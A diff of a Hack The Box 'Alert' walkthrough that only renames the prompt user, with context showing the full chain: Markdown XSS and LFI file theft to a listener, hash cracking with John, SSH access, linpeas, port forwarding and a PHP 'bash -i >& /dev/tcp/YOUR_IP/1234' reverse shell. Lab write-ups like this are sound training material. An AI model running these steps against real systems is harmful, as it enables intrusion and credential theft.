@@ -10,20 +10,20 @@
 ## 🔍 1.1 Nmap Scan
 
 ```bash
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nmap -sC -sV 10.129.250.23
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ nmap -sC -sV 10.129.250.23
 Output:
 
 22/tcp  open  ssh   OpenSSH 8.2p1
 80/tcp  open  http  Apache 2.4.41
 Add domain:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ sudo nano /etc/hosts
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ sudo nano /etc/hosts
 Add:
 
 10.129.250.23 alert.htb
 🌐 2. Subdomain Enumeration
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ffuf -u http://alert.htb/ \
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ ffuf -u http://alert.htb/ \
 -H "Host: FUZZ.alert.htb" \
 -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -ac
 Found:
@@ -32,16 +32,16 @@ pgsql
 statistics.alert.htb
 Add it:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ sudo nano /etc/hosts
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ sudo nano /etc/hosts
 pgsql
 10.129.250.23 statistics.alert.htb
 
 🪝 3. Foothold (Markdown XSS → LFI → File Exfiltration)
 Start listener:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ python3 -m http.server 8888
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ python3 -m http.server 8888
 Create malicious Markdown file:
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nano steal.md
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ nano steal.md
 Paste:
 
 html
@@ -62,10 +62,10 @@ albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
 🔓 4. Cracking Password
 Save hash:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
 Crack with John:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt
 John outputs:
 
 yaml
@@ -73,13 +73,13 @@ Copy code
 albert : PASSWORD
 SSH into the machine:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ssh albert@alert.htb
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ ssh albert@alert.htb
 You now have user access.
 
 📈 5. Privilege Escalation
 Upload linpeas:
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ scp linpeas.sh albert@alert.htb:/tmp/linpeas.sh
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ scp linpeas.sh albert@alert.htb:/tmp/linpeas.sh
 Run it:
 
 albert@alert:~$ bash /tmp/linpeas.sh
@@ -102,10 +102,10 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'");
 ?>
 6.2 Port Forwarding
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ssh -L 8080:127.0.0.1:8080 albert@alert.htb
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ ssh -L 8080:127.0.0.1:8080 albert@alert.htb
 6.3 Start Listener
 
-thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nc -lvnp 1234
+pluto@kali:/home/pluto/Desktop/htb/machines/alert$ nc -lvnp 1234
 6.4 Trigger the Reverse Shell
 Open browser:
 
